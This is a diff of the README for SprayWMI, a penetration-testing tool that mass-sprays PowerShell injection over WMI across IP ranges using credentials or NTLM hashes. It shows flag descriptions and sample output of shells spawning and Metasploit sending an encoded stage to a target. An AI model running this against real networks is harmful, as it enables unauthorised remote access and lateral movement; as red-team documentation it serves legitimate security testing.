@@ -3,14 +3,13 @@ SprayWMI is a method for mass spraying unicorn powershell injection to CIDR nota
 Written by David Kennedy @TrustedSec
 Special thanks: Justin Elze and Larry Spohn
 
-Initial Blog: https://www.trustedsec.com/june-2015/no_psexec_needed/
-if you have trouble with this on 64 bit - try:
+Initial Blog: https://www.trustedsec.com/june-2015/no_psexec_needed/ if you have trouble with this on 64 bit - try:
+
 dpkg --add-architecture i386 && apt-get update && apt-get install libpam0g:i386 && apt-get install libpopt0:i386
 
 Flag descriptions:
 
 DOMAIN - domain you are attacking - if its local, just specify workgroup
-
 USERNAME - username to authenticate on the remote Windows system
 PASSWORD - password or password hash lm:ntlm to use on the remote Windows system
 CIDR_RANGE,CIDR_RANGE or ips.txt - you can specify a single ip, a CIDR range (192.168.1.1/24) or multiple CIDRs such as 192.168.1.1/24,192.168.2.1/24. You can also specify a file (ex: file.txt) which has single IP addresses on a new line. 
@@ -99,7 +98,7 @@ root@stronghold:/home/relik# python spraywmi.py TS kennedy-test complexP255w0rd!
 [*] Launching WMI spray against IP: 192.168.1.13 - you should have a shell in the background. Once finished, shell will spawn
 [*] Spraying is still happening in the background, shells should arrive as they complete.
 [*] Interacting with Metasploit...
-...
+
 msf exploit(handler) > 
 [*] Encoded stage with x86/shikata_ga_nai
 [*] Sending encoded stage (885836 bytes) to 192.168.90.174
